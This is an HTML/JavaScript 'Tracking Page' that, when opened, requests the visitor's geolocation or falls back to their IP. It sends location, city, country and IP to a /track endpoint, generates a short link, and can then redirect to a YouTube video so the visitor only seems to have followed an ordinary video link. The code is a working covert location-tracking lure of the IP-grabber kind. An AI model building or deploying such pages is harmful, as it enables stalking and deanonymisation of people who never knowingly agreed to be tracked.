<!DOCTYPE html>
<html>
<head>
  <title>Tracking Page</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
  <style>
    #map { height: 320px; width: 100%; display: none; margin-top: 8px; }
  </style>
</head>
<body>
  <h2>Tracking Page</h2>
  <p id="short"></p>
  <div id="map" aria-label="Location map"></div>
  <div id="map-status" style="display:none; color:#555; margin-top:8px;"></div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const shouldRedirect = urlParams.get('redirectYoutube') === 'true';
    const youtubeUrl = urlParams.get('youtubeUrl') || 'https://www.youtube.com/watch?v=mYRV_B_QVGw';
    let latestShortCode = null;
    let mapInstance = null;

    function showMap(lat, lon) {
      if (lat == null || lon == null) return;
      const el = document.getElementById('map');
      el.style.display = 'block';
      if (!mapInstance) {
        mapInstance = L.map('map').setView([lat, lon], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: 'Â© OpenStreetMap contributors'
        }).addTo(mapInstance);
        L.marker([lat, lon]).addTo(mapInstance);
      } else {
        mapInstance.setView([lat, lon], 12);
        L.marker([lat, lon]).setLatLng([lat, lon]).addTo(mapInstance);
      }
    }

    function updateStatusFromData(data, code) {
      const city = data.city || 'Unknown';
      const country = data.country || 'Unknown';
      const ip = data.ip || '';
      const statusLine = 'Code: ' + (code ?? 'Unknown') + ' | City: ' + city + ' | Country: ' + country + ' | IP: ' + ip;
      const mapStatus = document.getElementById('map-status');
      mapStatus.style.display = 'block';
      mapStatus.innerText = statusLine;
    }

    function postShortLinkFromCoords(lat, lon) {
      fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({latitude: lat, longitude: lon})})
      .then(r => r.text())
      .then(code => {
        latestShortCode = code;
        const short = 'Short Link: http://localhost:8080/' + code;
        document.getElementById('short').innerText = short;
        // Get IP-based data for status/map
        fetch('/track/mapdata', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
          .then(r => r.json())
          .then(data => {
            updateStatusFromData(data, code);
            const lat2 = data.lat;
            const lon2 = data.lon;
            if (Number.isFinite(lat2) && Number.isFinite(lon2)) {
              showMap(lat2, lon2);
            }
            if (Number.isFinite(lat2) && Number.isFinite(lon2) && shouldRedirect) {
              window.location.href = youtubeUrl;
            }
          });
      });
    }

    function postShortLinkFromIP(){
      fetch('/track/device', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
        .then(r => r.text())
        .then(code => {
          latestShortCode = code;
          const short = 'Short Link: http://localhost:8080/' + code;
          document.getElementById('short').innerText = short;
          // IP-based data for status/map
          fetch('/track/mapdata', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({})})
            .then(r => r.json())
            .then(data => {
              updateStatusFromData(data, code);
              const lat = data.lat;
              const lon = data.lon;
              if (Number.isFinite(lat) && Number.isFinite(lon)) {
                showMap(lat, lon);
              }
              if (Number.isFinite(lat) && Number.isFinite(lon) && shouldRedirect) {
                window.location.href = youtubeUrl;
              }
            });
        });
    }

    document.addEventListener('DOMContentLoaded', function(){
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(function(pos){
          postShortLinkFromCoords(pos.coords.latitude, pos.coords.longitude);
        }, function(){
          // fallback to IP-based tracking when geolocation fails or is blocked
          postShortLinkFromIP();
        });
      } else {
        // no geolocation support
        postShortLinkFromIP();
      }
    });
  </script>
</body>
</html>
